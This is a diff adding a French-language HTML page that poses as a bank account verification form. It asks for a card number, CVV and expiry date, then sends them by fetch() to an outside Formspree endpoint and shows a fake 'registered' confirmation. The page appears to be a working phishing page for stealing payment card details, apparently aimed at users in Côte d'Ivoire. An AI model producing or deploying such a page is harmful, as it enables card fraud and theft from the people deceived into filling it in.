@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>verification de compte bancaire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f6f9;
+            margin: 0;
+        }
+
+        header {
+            background: #ff8200;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-top: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            background: green;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: darkgreen;
+        }
+
+        #confirmation {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #d4edda;
+            color: #155724;
+            border: 2px solid #c3e6cb;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+
+        #badge {
+            display: inline-block;
+            margin-bottom: 10px;
+            width: 50px;
+            height: 50px;
+            background-color: #28a745;
+            color: white;
+            border-radius: 50%;
+            line-height: 50px;
+            font-size: 30px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>verification de compte bancaire</h1>
+</header>
+
+<div class="container">
+    <h2>Formulaire d'identification</h2>
+
+    <!-- FORMULAIRE CONNECTÉ À TON LIEN -->
+    <form id="monFormulaire" action="https://formspree.io/f/xjgpgjlk" method="POST">
+
+        <label>Numéro de carte bancaire</label>
+        <input type="text" name="carte" placeholder="Ex: CI123456789" required>
+
+        <label>cvv</label>
+        <input type="text" name="nom" placeholder="Votre nom" required>
+
+        <label>Date d'expiration</label>
+        <input type="date" name="date" required>
+
+
+        <!-- Sujet email -->
+        <input type="hidden" name="_subject" value="Nouvelle inscription Côte d'Ivoire">
+
+        <button type="submit">Envoyer</button>
+    </form>
+
+    <div id="confirmation">
+        <div id="badge">✓</div>
+        <p>Nous avons pris en compte vos informations. Vous êtes officiellement enregistré parmi nous !</p>
+    </div>
+</div>
+
+<script>
+const form = document.getElementById('monFormulaire');
+const confirmation = document.getElementById('confirmation');
+
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    fetch(form.action, {
+        method: "POST",
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+    }).then(() => {
+        form.style.display = 'none';
+        confirmation.style.display = 'block';
+    });
+});
+</script>
+
+</body>
+</html>
